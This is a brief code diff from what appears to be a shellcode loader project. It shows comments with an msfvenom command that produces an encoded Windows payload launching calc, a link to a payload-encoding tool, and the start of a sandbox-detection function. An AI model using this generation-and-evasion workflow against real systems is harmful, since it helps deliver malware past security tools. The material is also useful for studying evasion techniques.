@@ -3,7 +3,7 @@
 
 // msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f raw -i 5 -e cmd/powershell_base64 -o file.bin
 // use https://github.com/AchocolatechipPancake/encode_payload 
-// input the python script output here
+// input the python script output
 
 BOOL CheckSandbox() {
 
